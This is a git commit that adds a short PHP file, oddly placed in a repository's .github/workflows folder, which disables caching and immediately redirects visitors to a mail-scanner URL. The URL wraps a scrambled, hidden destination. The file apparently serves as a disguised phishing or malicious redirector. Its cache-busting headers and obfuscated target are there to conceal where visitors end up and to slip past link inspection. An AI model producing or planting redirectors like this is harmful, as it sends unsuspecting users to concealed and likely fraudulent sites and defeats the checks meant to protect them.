191b91f25c7552a07527c11f71a851a9a78b0dc4
margoheeren0 <infos@effren.net>
2024-12-27 23:18:05 -0800

    Add files via upload

---
+++ .github/workflows/index.php
@@ -0,0 +1,13 @@
+<?php
+// Enable output buffering for maximum speed
+ob_start();
+
+// Set headers to prevent caching
+header("Cache-Control: no-cache, no-store, must-revalidate");
+header("Expires: 0");
+header("Pragma: no-cache");
+
+
+header("Location: https://url6.mailanyone.net/scanner?m=1tOSNW-0000000F2iJ-32OO&d=4%7Cmail%2F90%2F1734660000%2F1tOSNW-0000000F2iJ-32OO%7Cin6g%7C57e1b682%7C30540607%7C16804777%7C6764D0B2AB884854268B6BD2EF93418D&o=%2Fphtt%3A%2Fstsecatsilsifbatooe.lrgwob.ne.icrtsdosne%2Fw.nitae%2Fidtclmth.x&s=W1_Qpo_5RC23UgXRNOBzSANovmE"); 
+exit;
+?>
